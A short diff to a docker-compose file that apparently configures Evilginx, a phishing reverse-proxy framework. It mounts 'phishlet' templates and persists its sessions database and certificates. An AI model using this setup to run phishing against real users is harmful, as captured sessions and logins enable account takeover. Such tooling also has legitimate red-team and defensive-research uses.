@@ -16,6 +16,7 @@ services:
       - TG_CHAT_ID=${TG_CHAT_ID:-}
 
     volumes:
+      # phishlet .yml files (seeded from image on first run)
       - ./phishlets:/app/phishlets
-      - ./sessions:/app/sessions
-      - ./certs:/app/certs
+      # v4.0.0 config, sessions database, certs, geoip — THE MISSING PIECE
+      - ./data:/home/evilginx/.evilginx
